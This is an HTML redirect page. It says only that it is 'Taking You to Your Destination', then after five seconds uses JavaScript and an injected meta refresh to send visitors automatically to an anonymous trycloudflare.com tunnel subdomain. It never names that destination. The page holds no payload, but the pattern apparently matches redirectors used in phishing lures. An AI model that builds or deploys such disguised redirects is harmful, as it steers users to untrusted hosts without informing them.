<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #6e8efb, #a777e3);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            background-color: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.8s ease-out;
        }
        
        h1 {
            font-weight: 500;
            margin-bottom: 20px;
            font-size: 1.8rem;
        }
        
        p {
            margin-bottom: 30px;
            line-height: 1.6;
            opacity: 0.9;
        }
        
        .loader {
            width: 100%;
            height: 6px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            margin-bottom: 30px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            width: 0%;
            background-color: white;
            border-radius: 3px;
            animation: progress 5s linear forwards;
        }
        
        .btn {
            display: inline-block;
            padding: 12px 24px;
            background-color: white;
            color: #6e8efb;
            text-decoration: none;
            border-radius: 50px;
            font-weight: 500;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
            font-size: 1rem;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes progress {
            from { width: 0%; }
            to { width: 100%; }
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 1.5rem;
            }
            
            .btn {
                padding: 10px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Taking You to Your Destination</h1>
        <p>You'll be automatically redirected in just a moment. If nothing happens, please click the button below.</p>
        
        <div class="loader">
            <div class="progress"></div>
        </div>
        
        <a href="https://pig-calculated-controls-advances.trycloudflare.com" class="btn">Continue Now</a>
    </div>

    <script>
        // Set timeout for redirect
        setTimeout(function() {
            window.location.href = "https://pig-calculated-controls-advances.trycloudflare.com";
        }, 5000);
        
        // Fallback in case meta refresh doesn't work
        document.addEventListener('DOMContentLoaded', function() {
            const meta = document.createElement('meta');
            meta.httpEquiv = "refresh";
            meta.content = "5; url=https://pig-calculated-controls-advances.trycloudflare.com";
            document.getElementsByTagName('head')[0].appendChild(meta);
        });
    </script>
</body>
</html>
